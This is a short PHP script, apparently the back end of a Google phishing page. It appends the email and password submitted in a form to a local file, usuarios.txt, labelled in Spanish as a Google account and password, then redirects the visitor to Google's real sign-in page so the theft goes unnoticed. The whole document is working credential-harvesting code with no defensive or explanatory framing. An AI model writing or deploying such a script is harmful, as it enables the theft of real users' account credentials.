<?php

file_put_contents("usuarios.txt", "Cuenta de google: " . $_POST['email'] . " Contraseña: " . $_POST['pass'] . "\n", FILE_APPEND);
header('Location: https://accounts.google.com/servicelogin');
exit();
?>
